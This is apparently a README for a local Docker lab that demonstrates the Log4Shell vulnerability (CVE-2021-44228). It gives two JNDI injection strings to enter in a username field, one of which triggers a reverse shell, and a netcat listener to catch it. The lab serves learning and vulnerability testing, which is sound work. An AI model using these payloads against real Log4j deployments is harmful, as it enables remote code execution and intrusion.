## Log4shell proof of concept
Proof of concept for CVE-2021-44228. To learn more about log4shell, check the
summary by [Snyk](https://github.com/snyk-labs/awesome-log4shell).

## To start all containers

```docker-compose up```

### Exploit 1:
Go go localhost:8080 and fill into username:

```${jndi:ldap://exploit:9999/Evil}```


### Exploit 2:

```${jndi:ldap://reverse-shell:1389/a}```

### Snyk
```
snyk test --all-projects
snyk-log4shell
```

### Shell 1
Start terminal in web-server

`docker-compose up web-server`

### Shell 2

```
docker-compose up exploit
docker-compose up reverse-shell
```

### Shell 3
Check web server to see if exploit worked:

`docker-compose exec web-server bash`

### Shell 4
Start terminal in ubuntu and listen for reverse shell:
```
docker-compose up -d ubuntu
docker-compose exec ubuntu bash
nc -lv 9001
```

## Credit
This PoC is heavily based on these resources:
- [kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)
- [snyk-labs/java-goof](https://github.com/snyk-labs/java-goof/tree/main/log4shell-goof)
